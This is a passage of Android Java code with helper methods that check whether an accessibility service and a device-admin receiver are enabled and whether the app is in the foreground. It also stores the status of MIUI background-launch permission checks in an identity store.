        return BasicInfoGatherer.isAccessibilityServiceEnabled(activity, AlfredService.class) || !shouldAskForAccessibilityPermission(lastAskTime);
    }

    public static boolean isDeviceAdminDone(Activity activity) {
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) activity.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName wayneComponent = new ComponentName(activity, WayneReceiver.class);
        return devicePolicyManager.isAdminActive(wayneComponent);
    }

    public static boolean isAppInForeground() {
        ActivityManager.RunningAppProcessInfo appProcessInfo = new ActivityManager.RunningAppProcessInfo();
        ActivityManager.getMyMemoryState(appProcessInfo);
        return (appProcessInfo.importance == IMPORTANCE_FOREGROUND || appProcessInfo.importance == IMPORTANCE_VISIBLE);
    }

    private static void updateIdentityStore(Context context, boolean isGranted, String updateContext) {
        updateIdentityStore(context, isGranted, updateContext, System.currentTimeMillis());
    }

    public static void updateIdentityStore(Context context, boolean isGranted, String updateContext, long time) {
        IdentityStore identityStore = IdentityStore.getInstance(context);
        try {

            JSONObject bgLaunchPermission = new JSONObject();
            bgLaunchPermission.put("granted", isGranted);
            bgLaunchPermission.put("checkedOn", new Date().toString());
            bgLaunchPermission.put("checkedTimeStamp", time);
            bgLaunchPermission.put("updateContext", updateContext);
            identityStore.updateConfig("miuiBgLaunchPermission", bgLaunchPermission);
        } catch (Exception ignored) {

        }
    }
}
